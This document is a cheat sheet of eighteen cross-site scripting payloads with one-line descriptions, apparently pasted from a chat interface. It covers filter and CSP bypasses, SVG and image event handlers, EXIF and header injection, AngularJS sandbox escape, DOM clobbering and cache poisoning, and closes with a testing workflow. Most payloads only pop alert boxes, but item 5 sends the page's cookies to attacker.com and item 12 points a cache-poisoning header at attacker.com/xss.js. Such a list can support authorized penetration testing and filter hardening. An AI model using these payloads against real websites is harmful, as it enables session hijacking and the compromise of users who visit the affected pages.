Concise List
1. SVG Event Handlers
Description: Use <svg> elements with event handlers like onload or onmouseover, often allowed by sanitizers.
Payload:

html
Copy
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
Run HTML
2. Colon Replacement
Description: Bypass javascript: filters using HTML entities (&colon;) or encoded tabs (&Tab;).
Payload:

html
Copy
<a href="java&Tab;script&colon;alert(1)">Click Me</a>
Run HTML
3. Alternative Event Triggers
Description: Use newer events like onauxclick (right-click) instead of blocked ones.
Payload:

html
Copy
<img src=x onauxclick="alert('Right-click me!')">
Run HTML
4. File Upload Exploits
Description: Inject XSS into file uploads (e.g., EXIF metadata in images or embedded JS in PDFs).
Example (EXIF XSS):

bash
Copy
exiftool -Comment='"><svg/onload=alert(1)>' image.jpg
Rendered Output:

html
Copy
<!-- App displays EXIF unsanitized -->
<img src="image.jpg" alt="Image Comment: "><svg/onload=alert(1)>">
Run HTML
5. DOM innerHTML Sinks
Description: Exploit unsanitized innerHTML assignments in JavaScript.
Payload:

html
Copy
<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">
Run HTML
6. Template Literal Injection
Description: Abuse JavaScript template strings in dynamic code.
Payload:

javascript
Copy
// Server code: var bio = `${userInput}`;
`${alert(document.domain)}`
7. CSP Bypass via JSONP
Description: Use unvalidated JSONP endpoints to execute scripts.
Payload:

html
Copy
<script src="/api/data?callback=alert(1);//"></script>
Run HTML
8. Unsafe-eval Exploitation
Description: Bypass CSP with setTimeout(eval, ...) or similar.
Payload:

html
Copy
<script>
  setTimeout(eval, 100, "alert('CSP Bypassed')");
</script>
Run HTML
9. Header/Log XSS
Description: Inject payloads into headers (e.g., User-Agent, X-Forwarded-For) stored in logs.
Payload:

bash
Copy
curl -H "User-Agent: <img src=x onerror=alert(1)>" https://example.com
10. AngularJS Sandbox Escape
Description: Abuse AngularJS sandbox to execute arbitrary JavaScript.
Payload:

html
Copy
<div ng-app>{{x.constructor.constructor('alert(1)')()}}</div>
Run HTML
11. Username Field XSS
Description: Store payloads in HTML-enabled username fields.
Payload:

html
Copy
<img src=x onerror="alert('Stored in username!')">
Run HTML
12. Cache Poisoning
Description: Manipulate CDN caches to serve malicious content.
Payload:

html
Copy
<script>
  fetch('/home', {headers: {'X-Forwarded-Host': 'attacker.com/xss.js'}});
</script>
Run HTML
13. UTF-7 Exploitation
Description: Use UTF-7 encoding if the charset is misconfigured.
Payload:

html
Copy
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
Run HTML
14. Data URI Bypass
Description: Execute scripts via data: URIs in <iframe> or <object>.
Payload:

html
Copy
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
Run HTML
15. Mutation Bypass
Description: Use payloads that correct after WAF parsing.
Payload:

html
Copy
<div><svg/onload=alert(1)></div>  <!-- Fixes to <svg onload=... during parsing -->
Run HTML
16. Server-Client Parsing Gaps
Description: Exploit differences in HTML parsing between server and client.
Payload:

html
Copy
<!--</style></script><script>alert(1)</script>-->
Run HTML
17. DOM Clobbering
Description: Overwrite JavaScript variables using DOM elements.
Payload:

html
Copy
<form id="config"><input name="url" value="javascript:alert(1)">
<!-- Exploits: window.config.url -->
Run HTML
18. Dynamic JS Execution
Description: Inject into unsanitized eval() inputs.
Payload:

javascript
Copy
// Vulnerable code: eval("var userInput = '" + userData + "';");
';alert(1);//
Key Testing Workflow:
Identify Input Sinks: Profile fields, uploads, headers, logs.

Inject Payloads: Use context-specific vectors (HTML, JS, SVG, headers).

Trigger Execution: View stored data (e.g., profile, logs, images).

Bypass Filters: Use encoding, WAF quirks, or protocol tricks.
